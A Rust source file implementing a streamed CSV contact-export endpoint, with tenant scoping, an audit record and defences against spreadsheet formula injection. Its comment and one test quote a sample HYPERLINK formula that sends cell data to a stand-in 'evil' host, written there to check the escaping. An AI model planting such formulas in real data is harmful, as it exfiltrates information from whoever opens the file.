// SPDX-License-Identifier: AGPL-3.0-only

//! `POST /contacts/export`: every contact a filter matches, as CSV, **streamed**.
//!
//! Nothing here holds the result. A producer task reads rows off the wire one at a time, renders
//! them into a chunk of about [`CHUNK_BYTES`], and hands the chunk to the response body through a
//! channel of [`CHUNKS_IN_FLIGHT`] slots. A slow client fills the channel, `send` waits, the
//! producer stops reading, and the connection's own flow control stops Postgres. Memory is
//! therefore bounded by the chunk size, not by the row count.
//!
//! The producer is a task of its own for a second reason: it writes the audit row once the stream
//! ends, and a handler future is dropped when the client disconnects. Someone who reads half the
//! book and hangs up has still read half the book.

use std::borrow::Cow;

use axum::body::Body;
use chrono::{DateTime, SecondsFormat, Utc};
use futures_util::{StreamExt, stream};
use serde_json::{Value, json};
use sqlx::{PgPool, Postgres, QueryBuilder, Row, pool::PoolConnection};
use tokio::sync::mpsc;
use uuid::Uuid;

use super::{ContactFilter, push_filter};
use crate::{
    audit::{self, Actor, AuditEvent, actions},
    custom_fields::Definition,
    http::request_meta::RequestMeta,
    segments::{
        compile::{SUPPRESSION_ARMS, push_rules},
        rules::Group,
    },
};

/// A chunk is flushed to the client once it holds this many bytes.
const CHUNK_BYTES: usize = 32 * 1024;

/// Chunks the producer may be ahead of the client. With `CHUNK_BYTES` this is the whole of what
/// an export holds, however many contacts it covers.
const CHUNKS_IN_FLIGHT: usize = 2;

type Chunk = Result<Vec<u8>, std::io::Error>;

/// What the audit row needs that the stream does not know. `filter` is the document **already
/// redacted** by the caller: this module never sees the search text.
pub struct Audit {
    pub meta: RequestMeta,
    pub actor: Actor,
    pub filter: Value,
}

/// A cell, ready for a CSV file: neutralised against formula injection, then quoted if it must be.
///
/// A cell whose first character is `=`, `+`, `-`, `@`, tab or CR is a formula to Excel, Sheets
/// and LibreOffice, and a `first_name` of `=HYPERLINK("http://evil/?x="&A1,"click")` is settable
/// through any signup form. It would execute in the browser of whoever opens the export of the
/// whole book, who is the person with the most access. A leading `'` makes every one of them read
/// the cell as text. It is applied to **every** cell, a number included: a negative number comes
/// out as `'-5`, which is the price of there being no cell that is trusted.
fn push_cell(out: &mut String, cell: &str) {
    let formula = matches!(
        cell.chars().next(),
        Some('=' | '+' | '-' | '@' | '\t' | '\r')
    );
    let cell: Cow<str> = if formula {
        Cow::Owned(format!("'{cell}"))
    } else {
        Cow::Borrowed(cell)
    };
    if cell.contains([',', '"', '\n', '\r']) {
        out.push('"');
        out.push_str(&cell.replace('"', "\"\""));
        out.push('"');
    } else {
        out.push_str(&cell);
    }
}

fn push_row<'a>(out: &mut String, cells: impl IntoIterator<Item = &'a str>) {
    for (i, cell) in cells.into_iter().enumerate() {
        if i > 0 {
            out.push(',');
        }
        push_cell(out, cell);
    }
    out.push_str("\r\n");
}

/// A custom field's stored value as text; absent is empty, a multi_select is semicolon-joined.
fn attr_text(value: Option<&Value>) -> String {
    match value {
        None | Some(Value::Null) => String::new(),
        Some(Value::String(s)) => s.clone(),
        Some(Value::Array(items)) => items
            .iter()
            .filter_map(Value::as_str)
            .collect::<Vec<_>>()
            .join(";"),
        Some(other) => other.to_string(),
    }
}

/// The export query. **The workspace clause is written here**: neither `push_filter` nor
/// `push_rules` emits one, and a missing one exports every tenant's contacts.
///
/// `lists` and `tags` are every membership and tag, whatever the membership's status, as the
/// grid's `list_id` filter reads it. `contacts` is not aliased: the fragments the filter appends
/// refer to it by name.
fn query(
    workspace_id: Uuid,
    filter: &ContactFilter,
    rules: Option<&Group>,
) -> QueryBuilder<Postgres> {
    let mut q = QueryBuilder::<Postgres>::new(
        "select contacts.id, contacts.email, contacts.first_name, contacts.last_name, \
         contacts.timezone, contacts.created_at, contacts.updated_at, contacts.attributes, \
         coalesce((select string_agg(l.name, ';' order by l.name) \
            from list_memberships m join lists l \
              on l.workspace_id = m.workspace_id and l.id = m.list_id \
            where m.workspace_id = contacts.workspace_id and m.contact_id = contacts.id), '') \
            as lists, \
         coalesce((select string_agg(t.name, ';' order by t.name) \
            from contact_tags ct join tags t \
              on t.workspace_id = ct.workspace_id and t.id = ct.tag_id \
            where ct.workspace_id = contacts.workspace_id and ct.contact_id = contacts.id), '') \
            as tags, (",
    );
    for (i, arm) in SUPPRESSION_ARMS.iter().enumerate() {
        if i > 0 {
            q.push(" or ");
        }
        q.push("exists ").push(*arm);
    }
    q.push(") as suppressed from contacts where contacts.workspace_id = ")
        .push_bind(workspace_id);
    push_filter(&mut q, filter);
    if let Some(group) = rules {
        q.push(" and ");
        push_rules(&mut q, group);
    }
    q.push(" order by contacts.id");
    q
}

/// Starts the export and returns its body. `live` is the workspace's non-archived custom fields,
/// each a column named `attr:<key>` (the rule field's own spelling, so no key can collide with a
/// built-in column).
pub fn start(
    pool: PgPool,
    mut conn: PoolConnection<Postgres>,
    workspace_id: Uuid,
    filter: ContactFilter,
    rules: Option<Group>,
    live: Vec<Definition>,
    audit: Audit,
) -> Body {
    let (tx, mut rx) = mpsc::channel::<Chunk>(CHUNKS_IN_FLIGHT);
    tokio::spawn(async move {
        let job = Job {
            workspace_id,
            filter: &filter,
            rules: rules.as_ref(),
            live: &live,
        };
        let (rows, complete) = produce(&mut conn, &job, &tx).await;
        // Recorded whichever way it ended: complete, a database error, or a client that left. On
        // the pool, not `conn`: a client that left mid-result leaves rows unread on `conn`, and
        // the next statement on it would first read the rest of them.
        let recorded = audit::record(
            &pool,
            &audit.meta,
            AuditEvent {
                workspace_id: Some(workspace_id),
                actor: audit.actor,
                action: actions::CONTACTS_EXPORTED,
                target_type: None,
                target_id: None,
                metadata: json!({"filter": audit.filter, "rows": rows, "complete": complete}),
            },
        )
        .await;
        if let Err(e) = recorded {
            tracing::error!(error = ?e, "the export audit row could not be written");
        }
    });
    Body::from_stream(stream::poll_fn(move |cx| rx.poll_recv(cx)))
}

struct Job<'a> {
    workspace_id: Uuid,
    filter: &'a ContactFilter,
    rules: Option<&'a Group>,
    live: &'a [Definition],
}

/// Writes the CSV into `tx`; returns how many contacts were sent and whether the stream finished.
async fn produce(
    conn: &mut PoolConnection<Postgres>,
    job: &Job<'_>,
    tx: &mpsc::Sender<Chunk>,
) -> (u64, bool) {
    let mut head = String::new();
    let mut names: Vec<String> = ["id", "email", "first_name", "last_name", "timezone"]
        .into_iter()
        .chain(["created_at", "updated_at"])
        .map(str::to_owned)
        .collect();
    names.extend(job.live.iter().map(|d| format!("attr:{}", d.key)));
    names.extend(["lists", "tags", "suppressed"].map(str::to_owned));
    push_row(&mut head, names.iter().map(String::as_str));
    // The header goes out on its own, before the first row is read.
    if tx.send(Ok(head.into_bytes())).await.is_err() {
        return (0, false);
    }
    let mut q = query(job.workspace_id, job.filter, job.rules);
    let mut rows = q.build().fetch(&mut **conn);
    let mut chunk = String::new();
    let (mut sent, mut in_chunk) = (0u64, 0u64);
    while let Some(row) = rows.next().await {
        let row = match row {
            Ok(row) => row,
            Err(e) => {
                tracing::error!(error = ?e, "export query failed mid-stream");
                // Aborts the response rather than ending it, so a truncated file is an error to
                // the client and not a short file that looks whole.
                let _ = tx.send(Err(std::io::Error::other("export failed"))).await;
                return (sent, false);
            }
        };
        let attrs: Value = row.get("attributes");
        let created: DateTime<Utc> = row.get("created_at");
        let updated: DateTime<Utc> = row.get("updated_at");
        let mut cells: Vec<String> = vec![
            row.get::<Uuid, _>("id").to_string(),
            row.get("email"),
            row.get("first_name"),
            row.get("last_name"),
            row.get::<Option<String>, _>("timezone").unwrap_or_default(),
            created.to_rfc3339_opts(SecondsFormat::AutoSi, true),
            updated.to_rfc3339_opts(SecondsFormat::AutoSi, true),
        ];
        cells.extend(job.live.iter().map(|d| attr_text(attrs.get(&d.key))));
        cells.push(row.get("lists"));
        cells.push(row.get("tags"));
        cells.push(row.get::<bool, _>("suppressed").to_string());
        push_row(&mut chunk, cells.iter().map(String::as_str));
        in_chunk += 1;
        if chunk.len() >= CHUNK_BYTES {
            let full = std::mem::take(&mut chunk).into_bytes();
            if tx.send(Ok(full)).await.is_err() {
                return (sent, false);
            }
            sent += std::mem::take(&mut in_chunk);
        }
    }
    if !chunk.is_empty() && tx.send(Ok(chunk.into_bytes())).await.is_err() {
        return (sent, false);
    }
    (sent + in_chunk, true)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cell(s: &str) -> String {
        let mut out = String::new();
        push_cell(&mut out, s);
        out
    }

    #[test]
    fn every_formula_trigger_is_prefixed() {
        for lead in ["=", "+", "-", "@", "\t", "\r"] {
            let got = cell(&format!("{lead}1+1"));
            let got = got.trim_matches('"');
            assert!(got.starts_with('\''), "{lead:?} -> {got:?}");
        }
    }

    #[test]
    fn a_hyperlink_payload_is_text_and_still_one_cell() {
        assert_eq!(
            cell(r#"=HYPERLINK("http://evil/?x="&A1,"click")"#),
            r#""'=HYPERLINK(""http://evil/?x=""&A1,""click"")""#
        );
    }

    #[test]
    fn ordinary_cells_are_left_alone() {
        assert_eq!(cell("ada"), "ada");
        assert_eq!(cell("a=b"), "a=b");
        assert_eq!(cell(""), "");
        assert_eq!(cell("a,b"), "\"a,b\"");
    }
}
